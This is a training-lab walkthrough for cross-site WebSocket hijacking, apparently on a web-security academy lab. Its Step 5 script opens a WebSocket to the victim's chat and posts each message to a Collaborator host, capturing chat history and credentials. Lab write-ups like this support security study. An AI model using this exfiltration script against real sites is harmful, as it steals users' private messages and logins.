# Lab 3 — Cross-site WebSocket hijacking

> [← Back to WebSockets](../README.md)

---

## 🎯 Objective
Perform a cross-site WebSocket hijacking (CSWSH) attack to exfiltrate the victim's chat history and retrieve their credentials.

---

## 🪜 Steps

### Step 1 — Start WebSocket chat
Open the live chat, send a message, and capture the WebSocket handshake in Burp.

> 📸 Add screenshot here

---

### Step 2 — Identify the WebSocket handshake
In **Proxy → WebSockets history**, find the `101 Switching Protocols` upgrade request.
Note the WebSocket URL (e.g. `wss://YOUR-LAB-ID.web-security-academy.net/chat`).

> 📸 Add screenshot here

---

### Step 3 — Copy the WebSocket URL
Copy the full WebSocket endpoint URL for use in your exploit.

> 📸 Add screenshot here

---

### Step 4 — Generate Burp Collaborator payload
Go to **Burp → Collaborator** → click **Copy to clipboard**.
Save your Collaborator URL.

> 📸 Add screenshot here

---

### Step 5 — Create the exploit
On the **Exploit Server**, paste this in the body (replace URLs):

```html
<script>
  var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-ID.oastify.com', {
      method: 'POST',
      mode: 'no-cors',
      body: event.data
    });
  };
</script>
```

> 📸 Add screenshot here

---

### Step 6 — Test the exploit
Click **View exploit** to confirm it runs without errors.

> 📸 Add screenshot here

---

### Step 7 — Deliver exploit to victim
Click **Deliver to victim**.

> 📸 Add screenshot here

---

### Step 8 — Check Collaborator
Go back to **Burp Collaborator** → click **Poll now**.
You'll see the victim's chat history including their credentials (e.g. `carlos:PASSWORD`).

Use those credentials to login as Carlos and solve the lab.

> 📸 Add screenshot here

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
WebSocket connections don't follow CORS — they only check the `Origin` header during the handshake. If the server doesn't validate the origin, any site can open a WebSocket connection on behalf of the victim and exfiltrate data.
